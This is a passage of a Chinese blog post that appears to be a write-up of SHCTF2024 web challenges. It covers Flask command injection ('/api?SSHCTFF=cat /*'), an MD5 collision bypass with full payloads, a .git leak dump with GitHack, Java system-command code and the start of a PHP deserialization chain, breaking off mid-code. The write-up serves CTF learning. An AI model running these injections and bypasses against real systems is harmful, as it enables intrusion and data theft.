<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/luo.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/luo.jpg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <link rel="manifest" href="/manifest.json">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"luokuang1.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="[Week1] 1zflask题目提示robots,直接访问robots.txt即可获得&#x2F;s3recttt，下载app.py源码 1234567891011121314151617181920212223import osimport flaskfrom flask import Flask, request, send_from_directory, send_fileapp &#x3D; Flask(_">
<meta property="og:type" content="article">
<meta property="og:title" content="SHCTF2024">
<meta property="og:url" content="https://luokuang1.github.io/2024/11/04/SHCTF2024/index.html">
<meta property="og:site_name" content="luokuang的博客">
<meta property="og:description" content="[Week1] 1zflask题目提示robots,直接访问robots.txt即可获得&#x2F;s3recttt，下载app.py源码 1234567891011121314151617181920212223import osimport flaskfrom flask import Flask, request, send_from_directory, send_fileapp &#x3D; Flask(_">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://luokuang1.github.io/images/shctf1.png">
<meta property="og:image" content="https://luokuang1.github.io/images/shctf2.png">
<meta property="og:image" content="https://luokuang1.github.io/images/shctf3.png">
<meta property="og:image" content="https://luokuang1.github.io/images/shctf4.png">
<meta property="og:image" content="https://luokuang1.github.io/images/shctf5.png">
<meta property="og:image" content="https://luokuang1.github.io/images/shctf6.png">
<meta property="article:published_time" content="2024-11-04T14:16:36.000Z">
<meta property="article:modified_time" content="2025-02-19T14:58:30.409Z">
<meta property="article:author" content="luokuang">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://luokuang1.github.io/images/shctf1.png">


<link rel="canonical" href="https://luokuang1.github.io/2024/11/04/SHCTF2024/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://luokuang1.github.io/2024/11/04/SHCTF2024/","path":"2024/11/04/SHCTF2024/","title":"SHCTF2024"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>SHCTF2024 | luokuang的博客</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="luokuang的博客" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">luokuang的博客</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Week1-1zflask"><span class="nav-number">1.</span> <span class="nav-text">[Week1] 1zflask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week1-MD5-Master"><span class="nav-number">2.</span> <span class="nav-text">[Week1] MD5 Master</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week1-ez-gittt"><span class="nav-number">3.</span> <span class="nav-text">[Week1] ez_gittt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week1-jvav"><span class="nav-number">4.</span> <span class="nav-text">[Week1] jvav</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week1-poppopop"><span class="nav-number">5.</span> <span class="nav-text">[Week1] poppopop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week1-%E5%8D%95%E8%BA%AB%E5%8D%81%E5%85%AB%E5%B9%B4%E7%9A%84%E6%89%8B%E9%80%9F"><span class="nav-number">6.</span> <span class="nav-text">[Week1] 单身十八年的手速</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week1-%E8%9B%90%E8%9B%90-%E8%9B%90%E8%9B%90"><span class="nav-number">7.</span> <span class="nav-text">[Week1] 蛐蛐?蛐蛐!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week2-MD5-GOD"><span class="nav-number">8.</span> <span class="nav-text">[Week2]MD5 GOD!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week2-dickle"><span class="nav-number">9.</span> <span class="nav-text">[Week2]dickle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week2-guess-the-number"><span class="nav-number">10.</span> <span class="nav-text">[Week2]guess_the_number</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week2-%E5%85%A5%E4%BE%B5%E8%80%85%E7%A6%81%E5%85%A5"><span class="nav-number">11.</span> <span class="nav-text">[Week2]入侵者禁入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week2-%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81"><span class="nav-number">12.</span> <span class="nav-text">[Week2]登录验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week2-%E8%87%AA%E5%8A%A9%E6%9F%A5%E8%AF%A2"><span class="nav-number">13.</span> <span class="nav-text">[Week2]自助查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week3-%E5%B0%8F%E5%B0%8Fcms"><span class="nav-number">14.</span> <span class="nav-text">[Week3] 小小cms</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week3-love-flask"><span class="nav-number">15.</span> <span class="nav-text">[Week3] love_flask</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week3-%E6%8B%9C%E5%B8%88%E4%B9%8B%E6%97%85%C2%B7%E7%95%AA%E5%A4%96"><span class="nav-number">16.</span> <span class="nav-text">[Week3] 拜师之旅·番外</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week3-hacked-website"><span class="nav-number">17.</span> <span class="nav-text">[Week3] hacked_website</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Week4-0%E8%BF%9B%E5%88%B6%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="nav-number">18.</span> <span class="nav-text">[Week4] 0进制计算器</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="luokuang"
      src="/images/luo.jpg">
  <p class="site-author-name" itemprop="name">luokuang</p>
  <div class="site-description" itemprop="description">沉淀，还得继续沉淀</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://luokuang1.github.io/2024/11/04/SHCTF2024/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/luo.jpg">
      <meta itemprop="name" content="luokuang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="luokuang的博客">
      <meta itemprop="description" content="沉淀，还得继续沉淀">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="SHCTF2024 | luokuang的博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SHCTF2024
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-11-04 22:16:36" itemprop="dateCreated datePublished" datetime="2024-11-04T22:16:36+08:00">2024-11-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-02-19 22:58:30" itemprop="dateModified" datetime="2025-02-19T22:58:30+08:00">2025-02-19</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="Week1-1zflask"><a href="#Week1-1zflask" class="headerlink" title="[Week1] 1zflask"></a>[Week1] 1zflask</h3><p>题目提示robots,直接访问robots.txt即可获得/s3recttt，下载app.py源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_from_directory, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;SSHCTFF&#x27;</span>, <span class="string">&#x27;ls /&#x27;</span>)</span><br><span class="line">    result = os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/robots.txt&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_from_root</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.static_folder,<span class="string">&#x27;robots.txt&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/s3recttt&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    file_path = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(file_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>直接访问/api即可进行rce</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api?<span class="variable constant_">SSHCTFF</span>=cat <span class="comment">/*</span></span><br></pre></td></tr></table></figure>
<h3 id="Week1-MD5-Master"><a href="#Week1-MD5-Master" class="headerlink" title="[Week1] MD5 Master"></a>[Week1] MD5 Master</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line"></span><br><span class="line"><span class="variable">$master</span> = <span class="string">&quot;MD5 master!&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>] !== <span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$master</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;master? &lt;br&gt;&quot;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>md5强碰撞绕过即可，这里需要碰撞前的字符串为MD5 master!，这样就可以达到绕过，通过bp提交即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master1=%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%3D%<span class="variable constant_">DD</span>%<span class="variable constant_">F6FS</span>%<span class="number">00</span>%0B%<span class="variable constant_">AE</span>%3E%<span class="number">21</span>%0Es%<span class="variable constant_">E2</span>%89r%<span class="variable constant_">EA</span>%8D%3A%<span class="variable constant_">F2</span>%<span class="number">21</span>%1C%<span class="variable constant_">E9</span>%<span class="number">22</span>%1CD%<span class="variable constant_">D2</span>%7E%<span class="variable constant_">FAL</span>%<span class="number">10</span>%<span class="variable constant_">A2</span>%1D%9D%<span class="variable constant_">F1</span>%<span class="variable constant_">F2</span>%F6l%<span class="variable constant_">AB</span>%<span class="number">85</span>%<span class="number">18</span>%<span class="variable constant_">EF</span>%<span class="variable constant_">C1A</span>%1B%<span class="variable constant_">C8WL</span>%<span class="number">88</span>%<span class="variable constant_">AC</span>%7D%<span class="variable constant_">FC</span>%<span class="variable constant_">E7</span>%<span class="variable constant_">C1</span>%7D%3DG%<span class="variable constant_">BDD</span>%0BEsbAQtY%8DP%<span class="number">23</span>%<span class="variable constant_">FE</span>%<span class="variable constant_">F8</span>%<span class="variable constant_">F2</span>%8D%<span class="number">14</span>%<span class="variable constant_">F2S</span>%<span class="variable constant_">A8</span>%<span class="variable constant_">BE</span>%<span class="variable constant_">E7</span>%<span class="number">96</span>%<span class="number">00</span>%10x%<span class="number">97</span>%<span class="variable constant_">C8</span>%<span class="variable constant_">E3L</span>%<span class="variable constant_">DD</span>%1C%25l%<span class="variable constant_">E7Q</span>%<span class="variable constant_">C7</span>%7C%<span class="variable constant_">DE</span>%<span class="number">21</span>%<span class="number">88</span>%<span class="variable constant_">F2</span>%<span class="number">19</span>%<span class="variable constant_">BC</span>%<span class="number">91</span>%<span class="number">10</span>%<span class="number">87</span>%9A%<span class="number">15</span>%<span class="variable constant_">C5Y</span>%9D%<span class="number">88</span>%<span class="variable constant_">F6</span>%<span class="variable constant_">DD</span>%<span class="variable constant_">C9</span>%3C%0D%<span class="variable constant_">DD</span>%<span class="number">89</span>%<span class="variable constant_">D6</span>%<span class="variable constant_">F3</span>%<span class="number">15</span>%<span class="variable constant_">B0</span>%<span class="variable constant_">ED</span>%<span class="variable constant_">CEY</span>%D3tck&amp;master2=%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%3D%<span class="variable constant_">DD</span>%<span class="variable constant_">F6FS</span>%<span class="number">00</span>%0B%<span class="variable constant_">AE</span>%3E%<span class="number">21</span>%0Es%<span class="variable constant_">E2</span>%89r%<span class="variable constant_">EA</span>%8D%3A%<span class="variable constant_">F2</span>%<span class="variable constant_">A1</span>%1C%<span class="variable constant_">E9</span>%<span class="number">22</span>%1CD%<span class="variable constant_">D2</span>%7E%<span class="variable constant_">FAL</span>%<span class="number">10</span>%<span class="variable constant_">A2</span>%1D%9D%<span class="variable constant_">F1</span>%<span class="variable constant_">F2</span>%F6l%<span class="variable constant_">AB</span>%<span class="number">85</span>%<span class="number">18</span>%<span class="variable constant_">EF</span>%<span class="variable constant_">C1A</span>%1B%<span class="variable constant_">C8</span>%<span class="variable constant_">D7L</span>%<span class="number">88</span>%<span class="variable constant_">AC</span>%7D%<span class="variable constant_">FC</span>%<span class="variable constant_">E7</span>%<span class="variable constant_">C1</span>%7D%3DG%<span class="variable constant_">BDD</span>%0B%C5sbAQtY%8DP%<span class="number">23</span>%<span class="variable constant_">FE</span>%<span class="variable constant_">F8</span>%<span class="variable constant_">F2</span>%8D%<span class="number">14</span>%<span class="variable constant_">F2S</span>%<span class="variable constant_">A8</span>%<span class="variable constant_">BE</span>%<span class="variable constant_">E7</span>%<span class="number">96</span>%<span class="number">00</span>%10x%<span class="number">17</span>%<span class="variable constant_">C8</span>%<span class="variable constant_">E3L</span>%<span class="variable constant_">DD</span>%1C%25l%<span class="variable constant_">E7Q</span>%<span class="variable constant_">C7</span>%7C%<span class="variable constant_">DE</span>%<span class="number">21</span>%<span class="number">88</span>%<span class="variable constant_">F2</span>%<span class="number">19</span>%<span class="variable constant_">BC</span>%<span class="number">91</span>%<span class="number">10</span>%<span class="number">87</span>%9A%<span class="number">15</span>%<span class="variable constant_">C5Y</span>%9D%<span class="number">08</span>%<span class="variable constant_">F6</span>%<span class="variable constant_">DD</span>%<span class="variable constant_">C9</span>%3C%0D%<span class="variable constant_">DD</span>%<span class="number">89</span>%<span class="variable constant_">D6</span>%<span class="variable constant_">F3</span>%<span class="number">15</span>%<span class="variable constant_">B0</span>%<span class="variable constant_">ED</span>%<span class="variable constant_">CE</span>%<span class="variable constant_">D9</span>%D3tck</span><br></pre></td></tr></table></figure>
<h3 id="Week1-ez-gittt"><a href="#Week1-ez-gittt" class="headerlink" title="[Week1] ez_gittt"></a>[Week1] ez_gittt</h3><p>git泄露，直接通过GitHack来查看即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 <span class="title class_">GitHack</span>.<span class="property">py</span> <span class="attr">http</span>:<span class="comment">//210.44.150.15:47817/.git/</span></span><br><span class="line">git show</span><br></pre></td></tr></table></figure>
<h3 id="Week1-jvav"><a href="#Week1-jvav" class="headerlink" title="[Week1] jvav"></a>[Week1] jvav</h3><p>这个题要通过java来执行系统命令来获取flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="keyword">void</span> <span class="title function_ invoke__">main</span>(String[] args) &#123;</span><br><span class="line">        <span class="comment">// 创建ProcessBuilder对象，传入&quot;ls&quot;命令</span></span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 启动进程</span></span><br><span class="line">            Process process = processBuilder.<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用BufferedReader读取进程的输出流</span></span><br><span class="line">            BufferedReader reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.<span class="title function_ invoke__">getInputStream</span>()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.<span class="title function_ invoke__">readLine</span>()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 打印输出结果</span></span><br><span class="line">                System.out.<span class="title function_ invoke__">println</span>(line);</span><br><span class="line">            &#125;</span><br><span class="line">            reader.<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待进程结束，并获取退出值</span></span><br><span class="line">            <span class="keyword">int</span> exitCode = process.<span class="title function_ invoke__">waitFor</span>();</span><br><span class="line">            <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.<span class="title function_ invoke__">println</span>(<span class="string">&quot;Command executed successfully.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.<span class="title function_ invoke__">println</span>(<span class="string">&quot;Command execution failed with exit code: &quot;</span> + exitCode);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.<span class="title function_ invoke__">printStackTrace</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="comment">// 重新设置中断标志</span></span><br><span class="line">            Thread.<span class="title function_ invoke__">currentThread</span>().<span class="title function_ invoke__">interrupt</span>();</span><br><span class="line">            e.<span class="title function_ invoke__">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Week1-poppopop"><a href="#Week1-poppopop" class="headerlink" title="[Week1] poppopop"></a>[Week1] poppopop</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SH</span> &#123; </span><br><span class="line">    public <span class="keyword">static</span> $Web = <span class="literal">false</span>; </span><br><span class="line">    public <span class="keyword">static</span> $SHCTF = <span class="literal">false</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123; </span><br><span class="line">    public $p; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">flag</span>(<span class="params"></span>) </span><br><span class="line">    &#123; </span><br><span class="line">        ($this-&gt;p)(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">T</span>&#123; </span><br><span 